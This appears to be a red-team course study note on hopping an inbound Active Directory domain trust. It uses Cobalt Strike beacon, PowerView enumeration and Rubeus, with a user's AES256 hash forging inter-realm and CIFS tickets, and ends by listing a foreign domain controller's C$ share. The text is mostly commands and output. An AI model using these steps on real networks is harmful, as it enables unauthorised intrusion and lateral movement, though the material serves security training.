
#### ğŸ–Šï¸ via Cobalt Strike

Lets assume `dev-studio.com` trusts `dev.cyberbotic.io`, one way trust, meaning `dev.cyberbotic.io` has Inbound Trust.

1) Let's check our domain trust

```
beacon> powershell Get-DomainTrust

SourceName Â  Â  Â : dev.cyberbotic.io
TargetName Â  Â  Â : dev-studio.com
TrustType Â  Â  Â  : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : 
TrustDirection Â : Inbound
```

2) Because the trust is inbound from our perspective, it means that principals in our domain can be granted access to resources in the foreign domain. Â We can enumerate the foreign domain across the trust.

```
beacon> powershell Get-DomainComputer -Domain dev-studio.com -Properties DnsHostName

dnshostname Â  Â  Â 
----------- Â  Â  Â 
dc.dev-studio.com
```

3) `Get-DomainForeignGroupMember` will enumerate any groups that contain users outside of its domain and return its members.

```
beacon> powershell Get-DomainForeignGroupMember -Domain dev-studio.com

GroupDomain Â  Â  Â  Â  Â  Â  : dev-studio.com
GroupName Â  Â  Â  Â  Â  Â  Â  : Administrators
GroupDistinguishedName Â : CN=Administrators,CN=Builtin,DC=dev-studio,DC=com
MemberDomain Â  Â  Â  Â  Â  Â : dev-studio.com
MemberName Â  Â  Â  Â  Â  Â  Â : S-1-5-21-569305411-121244042-2357301523-1120
MemberDistinguishedName : CN=S-1-5-21-569305411-121244042-2357301523-1120,CN=ForeignSecurityPrincipals,DC=dev-studio,DC=com
```

4) This output shows that there's a member of the domain's built-in Administrators group who is not part of dev-studio.com. The MemberName field contains a SID that can be resolved in our current domain.

```
beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1120

DEV\Studio Admins
```

5) To hop this trust, we only need to impersonate a member of this group named Studio Admins

```
beacon> powershell Get-DomainGroupMember -Identity "Studio Admins" | select MemberName

MemberName
----------
nlamb
```

6) To hop a domain trust using Kerberos, we first need an inter-realm key. Â Obtain a TGT for the target user (here I am using `asktgt` with their AES256 hash).

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /domain:dev.cyberbotic.io /aes256:a779fa8afa28d66d155d9d7c14d394359c5d29a86b6417cb94269e2e84c4cee4 /nowrap
```

7) Next, use that TGT to request a referral ticket from the current domain to the target domain.

`beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:krbtgt/dev-studio.com /domain:dev.cyberbotic.io /dc:dc-2.dev.cyberbotic.io /ticket:doIFwj[...]MuaW8= /nowrap`

âš  If this inter-realm ticket is of type `rc4_hmac` even though our TGT was `aes256_cts_hmac_sha1`, this is the default configuration unless AES has been specifically configured on the trust, so this is not necessarily bad OPSEC.

8) Finally, use this inter-realm ticket to request TGS's in the target domain. Â Here, I'm requesting a ticket for CIFS.

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/dc.dev-studio.com /domain:dev-studio.com /dc:dc.dev-studio.com /ticket:doIFoz[...]NPTQ== /nowrap

...

beacon> run klist

Current LogonId is 0:0x45bcb0

Cached Tickets: (1)

#0>	Client: nlamb @ DEV.CYBERBOTIC.IO
	Server: cifs/dc.dev-studio.com @ DEV-STUDIO.COM
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	
beacon> ls \\dc.dev-studio.com\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     08/16/2022 09:15:48   $Recycle.Bin
          dir     08/10/2022 04:55:17   $WinREAgent
          dir     08/10/2022 05:05:53   Boot
```




#### âš  Opsec




### Properties
---
ğŸ“† created   {{27-02-2024}} 12:02
ğŸ·ï¸ tags: #redteam #crto 

---

